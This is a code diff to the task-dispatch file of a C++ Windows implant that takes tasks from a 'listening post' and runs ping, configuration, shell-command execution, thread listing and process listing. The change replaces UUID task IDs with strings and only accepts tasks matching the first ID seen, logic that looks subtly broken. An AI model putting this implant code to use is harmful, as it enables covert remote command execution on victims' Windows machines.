@@ -16,7 +16,8 @@
 #include <Windows.h>
 #include <tlhelp32.h>
 
-
+bool idSet = false;
+std::string id;
 // Function to parse the tasks from the property tree returned by the listening post
 // Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
@@ -24,19 +25,23 @@
     // Get the task type and identifier, declare our variables
     const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
     const auto idString = taskTree.get_child("task_id").get_value<std::string>();
-    std::stringstream idStringStream{ idString };
-    boost::uuids::uuid id{};
-    idStringStream >> id;
+    //std::stringstream idStringStream{ idString };
+    if (idSet == false) 
+    { 
+        id = idString;
+        idSet = true;
+    }
+    //idStringStream >> id;
 
     // Conditionals to determine which task should be executed based on key provided
     // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
     // ===========================================================================================
-    if (taskType == PingTask::key) {
+    if (taskType == PingTask::key && idString == id) {
         return PingTask{
             id
         };
     }
-    if (taskType == ConfigureTask::key) {
+    if (taskType == ConfigureTask::key && idString == id) {
         return ConfigureTask{
             id,
             taskTree.get_child("dwell").get_value<double>(),
@@ -44,19 +49,19 @@
             std::move(setter)
         };
     }
-    if (taskType == ExecuteTask::key) {
+    if (taskType == ExecuteTask::key && idString == id) {
         return ExecuteTask{
             id,
             taskTree.get_child("command").get_value<std::string>()
         };
     }
-    if (taskType == ListThreadsTask::key) {
+    if (taskType == ListThreadsTask::key && idString == id) {
         return ListThreadsTask{
             id,
             taskTree.get_child("procid").get_value<std::string>()
         };
     }
-    if (taskType == ListRunningProcesses::key) {
+    if (taskType == ListRunningProcesses::key && idString == id) {
         return ListRunningProcesses{
             id
         };
@@ -80,7 +85,7 @@ Configuration::Configuration(const double meanDwell, const bool isRunning)
 
 // PingTask
 // -------------------------------------------------------------------------------------------
-PingTask::PingTask(const boost::uuids::uuid& id)
+PingTask::PingTask(const std::string& id)
     : id{ id } {}
 
 Result PingTask::run() const {
@@ -91,7 +96,7 @@ Result PingTask::run() const {
 
 // ConfigureTask
 // -------------------------------------------------------------------------------------------
-ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
+ConfigureTask::ConfigureTask(const std::string& id,
     double meanDwell,
     bool isRunning,
     std::function<void(const Configuration&)> setter)
@@ -109,7 +114,7 @@ Result ConfigureTask::run() const {
 
 // ExecuteTask
 // -------------------------------------------------------------------------------------------
-ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string command)
+ExecuteTask::ExecuteTask(const std::string& id, std::string command)
     : id{ id },
     command{ std::move(command) } {}
 
@@ -135,7 +140,7 @@ Result ExecuteTask::run() const {
 
 // ListThreadsTask
 // -------------------------------------------------------------------------------------------
-ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string processId)
+ListThreadsTask::ListThreadsTask(const std::string& id, std::string processId)
     : id{ id },
     processId{ processId } {}
 
@@ -200,7 +205,7 @@ Result ListThreadsTask::run() const {
 
 // ListRunningProcesses
 // -------------------------------------------------------------------------------------------
-ListRunningProcesses::ListRunningProcesses(const boost::uuids::uuid& id)
+ListRunningProcesses::ListRunningProcesses(const std::string& id)
     : id{ id } {}
 
 Result ListRunningProcesses::run() const {
